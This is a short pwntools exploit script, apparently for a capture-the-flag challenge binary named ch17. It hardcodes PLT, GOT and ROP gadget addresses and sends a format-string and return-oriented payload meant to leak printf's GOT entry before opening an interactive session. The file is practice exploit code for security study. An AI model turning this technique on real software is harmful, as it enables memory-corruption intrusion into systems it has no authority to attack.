#!/usr/bin/python3
from pwn import*

p = process("./ch17")

gdb.attach(p, gdbscript='''
b*0x080485ad
c
''')
print_plt   = 0x08048390
printf_got  = 0x0804a010
fget_plt    = 0x080483a0
fget_got    = 0x0804a014
main        = 0x08048506

edi_ebp       = 0x0804864a

payload = b"%117x" + p32(edi_ebp) + p32(printf_got) + p32(0) + p32(print_plt)
p.sendline(payload)
p.interactive()


#%1$p = payload